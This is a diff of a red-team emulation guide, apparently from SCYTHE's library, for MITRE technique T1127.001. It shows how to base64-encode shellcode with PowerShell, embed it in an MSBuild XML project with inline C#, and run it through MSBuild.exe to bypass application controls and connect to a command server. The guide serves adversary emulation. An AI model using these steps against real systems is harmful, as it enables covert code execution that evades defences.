@@ -1,6 +1,6 @@
 # T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild
 
-This SCYTHE Compound Action leverages the native Windows utility MSBuild to execute malicious code. This is a LOLBAS attack that uses the MSBuild compiler to dynamically compile and execute C# code contained within an XML file to decode and run shellcode. The shellcode runs within the MSBuild.exe process. Since the MSBuild executable is digitally signed by Microsoft, this attack is also bypass of many common Application Controls. For more about abuse of MSBuild: https://attack.mitre.org/techniques/T1127/001/ 
+This SCYTHE Compound Action leverages the native Windows utility MSBuild to execute malicious code. This is a LOLBAS attack that uses the MSBuild compiler to dynamically compile and execute C# code contained within an XML file. The C# code decodes and runs shellcode, which runs within the MSBuild.exe process. Since the MSBuild executable is digitally signed by Microsoft, this attack is also a bypass of many common Application Controls. For more about abuse of MSBuild: https://attack.mitre.org/techniques/T1127/001/ 
 
 ## Obtaining the Shellcode
 
@@ -10,7 +10,7 @@ Create a Campaign in the SCYTHE UI. Then, follow the instructions below dependin
 
 ### Pre-3.4
 
-In the Campaign List, select the Campaign that you created to view its detailed page. Click the "More Actions..." dropdown menu, and select "Direct-Downloads Links". You will be shown a list of download links. Each is the SCYTHE client in a different executable format. To download the shellcode format, choose either the 32-bit or 64-bit "Reflective Loader DLL" link and paste it into your browser. The shellcode should begin downloading.
+In the Campaign List, select the Campaign that you created to view its detailed page. Click the "More Actions..." dropdown menu, and select "Direct-Downloads Links". You will be shown a list of download links. Each is the SCYTHE client in a different executable format. To download the shellcode format, choose either the 32-bit or 64-bit "Reflective Loader + DLL" link and paste it into your browser. The shellcode should begin downloading.
 
 ### 3.4
 
@@ -29,7 +29,7 @@ $filename = "C:\\Users\\User\\Downloads\\test1_scythe_client32.bin"
 [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename)) | clip
 ```
  
-2) You will now have a large Base64 string in your clipboard that you may paste elsewhere. Create a new XML file with and paste the following into it:
+2) You will now have a large Base64 string in your clipboard that you may paste elsewhere. Create a new XML file with and paste the following into it, replacing the existing Base64 string:
 
 ```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -96,12 +96,12 @@ AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Task
 </Project>
 ```
 
-3) Replace the existing base64 string with your own. 
-    * Delete the text between the double quotes and the paste from your clipboard.
+3) When you replace the existing base64 string with your own, keep in mind the following. 
+    * Delete the pre-existing text between the double quotes and the paste from your clipboard.
     * Make sure that there are no spaces or newlines inside of the string or between the double quotes.
-4) Save the file as an XML file (such as msbuild.xml).
+4) Save the file as an XML file (such as `msbuild.xml`).
 5) In your Powershell prompt, run the following command, replacing the path to the .XML file with your own:
     * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\msbuild.xml`
-    * The SCYTHE client should connect with your SCYTHE server
+    * The SCYTHE client should connect with your SCYTHE server.
     * If the Powershell window is closed, connection will drop.
     * Alternative, you may run the following command to execute the code in the background so that you may safely close your Powershell prompt: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\msbuild.xml &`
